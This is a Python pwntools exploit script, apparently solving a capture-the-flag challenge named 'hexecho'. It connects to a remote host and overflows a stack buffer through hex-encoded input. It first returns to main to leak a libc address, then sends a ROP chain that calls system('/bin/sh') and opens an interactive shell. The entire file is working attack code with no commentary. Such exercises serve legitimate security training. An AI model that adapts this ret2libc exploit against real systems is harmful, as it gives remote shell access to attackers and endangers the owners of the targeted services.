from pwn import *

elf = ELF("./hexecho")
libc = ELF("./libc.so.6")

context.arch = 'amd64'

p = remote("34.170.146.252", 42121)

p.sendlineafter(b"Size: ", b"296")

main_addr = elf.symbols['main']

ret_main = p64(next(elf.search(asm("ret"), executable=True)))
ret_main += p64(main_addr)

payload = b"+ "*0x118
payload += b" ".join([f"{c:02x}".encode() for c in ret_main])

p.sendlineafter(b"Data (hex): ", payload)

p.recvuntil(b"Received: ")
leak = bytes([int(c, 16) for c in p.recvline().split()])
libc.address = u64(leak[0x98:0xa0]) - libc.symbols['_IO_2_1_stdout_']
log.info(hex(libc.address))

rop = p64(next(libc.search(asm("pop rdi; ret"), executable=True)))
rop += p64(next(libc.search(b"/bin/sh\x00")))
rop += p64(next(libc.search(asm("ret"), executable=True)))
rop += p64(libc.symbols["system"])

rop_payload = b"+ "*0x118
rop_payload += b" ".join([f"{c:02x}".encode() for c in rop])

p.sendlineafter(b"Size: ", b"312")
p.sendlineafter(b"Data (hex): ", rop_payload)

p.recvline()
p.interactive()
